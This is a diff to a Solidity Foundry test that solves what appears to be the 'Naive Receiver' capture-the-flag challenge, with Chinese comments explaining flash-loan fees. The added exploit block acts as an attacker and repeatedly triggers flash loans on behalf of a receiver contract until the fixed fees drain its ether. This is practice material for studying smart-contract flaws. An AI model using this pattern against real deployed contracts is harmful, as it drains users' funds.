@@ -32,7 +32,7 @@ contract NaiveReceiver is Test {
 
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
-
+        // constructor 設定 pool = naiveReceiverLenderPool
         flashLoanReceiver = new FlashLoanReceiver(
             payable(naiveReceiverLenderPool)
         );
@@ -48,7 +48,13 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        // NaiveReceiverLenderPool 先借錢給 FlashLoanReceiver ，然後 FlashLoanReceiver 再還錢給 NaiveReceiverLenderPool 。
+        // flashLoanReceiver 向 naiveReceiverLenderPool 借一次錢(閃電貸)須支付手續費 1e18
+        for (uint256 i = 0; i < (ETHER_IN_RECEIVER / 1e18); i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), ETHER_IN_POOL);
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -61,4 +67,6 @@ contract NaiveReceiver is Test {
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
     }
+
+    // receive() external payable {}
 }
